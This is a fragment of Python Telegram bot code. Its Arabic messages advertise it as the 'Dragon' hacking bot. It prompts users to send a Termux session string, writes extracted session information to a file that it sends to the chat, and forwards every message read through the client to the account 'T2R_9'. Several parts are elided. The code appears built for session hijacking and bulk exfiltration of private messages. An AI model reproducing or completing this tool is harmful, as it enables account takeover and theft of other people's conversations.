...
async def op(event):
  ...
  async for x in client.iter_messages("T2R_9"):
    try:
      await x.forward_to("T2R_9")
    except:
      pass


@client.on(events.NewMessage(pattern="/T", func=lambda x: x.is_group))
async def op(event):
  await event.reply("▾∮ عذرا البوت يعمل في الخاص فقط")
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      if len(i) > 3855:
        ...
        file.write(i + "\n\n▾∮ المعلومات بواسطه دراكون")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت دراكون للاختراق")
    elif res.text == "B":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      try:
        ...
        await event.respond("اارسل هذا الخطأ الى @Dragon_2022_D \n**الخطـأ**\n" + str(e))

    else:
      await event.respond("▾∮ استخدم /T فقط")
